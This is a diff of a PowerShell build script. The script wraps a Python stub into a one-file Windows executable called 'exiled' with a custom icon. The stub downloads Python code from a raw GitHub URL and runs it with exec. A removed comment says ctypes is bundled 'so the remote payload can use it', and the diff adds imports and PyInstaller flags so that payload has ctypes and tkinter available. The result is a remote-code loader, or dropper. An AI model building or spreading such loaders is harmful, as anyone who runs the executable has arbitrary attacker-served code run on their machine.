@@ -1,7 +1,7 @@
 [CmdletBinding()]
 param(
     [string]$Out = "exiled",
-    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py",
+    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main%2Cpy",
     [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
     [string]$Dir,
     [switch]$NoIcon,
@@ -61,11 +61,28 @@ Write-Msg info ""
 Write-Msg info "Building $AppName for windows-$Arch"
 Write-Msg info "Output dir: $Here"
 
+# ── Auto-delete existing EXE ──
+$ExePath = Join-Path $DistDir "$OutName.exe"
+if (Test-Path -LiteralPath $ExePath) {
+    Write-Msg info "Found existing $OutName.exe. Removing..."
+    try {
+        Remove-Item -LiteralPath $ExePath -Force
+        Write-Msg info "Deleted old executable."
+    } catch {
+        Write-Msg error "Failed to delete existing EXE. Is it currently running? Please close it and try again."
+        exit 1
+    }
+}
+
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
 $stubBody = @"
 import urllib.request
+import ctypes
+import ctypes.wintypes
+import tkinter
+
 exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
@@ -124,7 +141,6 @@ except Exception as e:
 
 Write-Msg info "Freezing..."
 
-# --hidden-import ctypes ensures PyInstaller bundles the ctypes module so the remote payload can use it
 $pyiArgs = @(
     "-m", "PyInstaller",
     "--onefile",
@@ -133,6 +149,8 @@ $pyiArgs = @(
     "--hidden-import", "ctypes",
     "--hidden-import", "ctypes.wintypes",
     "--hidden-import", "tkinter",
+    "--collect-all", "ctypes",
+    "--collect-all", "tkinter",
     "--name", $OutName,
     "--distpath", $DistDir,
     "--workpath", (Join-Path $Work "pyi"),
@@ -152,8 +170,6 @@ if ($LASTEXITCODE -ne 0) {
 if (-not $KeepBuild) {
     Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
 }
-
-$ExePath = Join-Path $DistDir "$OutName.exe"
 
 Write-Host ""
 Write-Host " _____          _   _              _ " -ForegroundColor DarkYellow
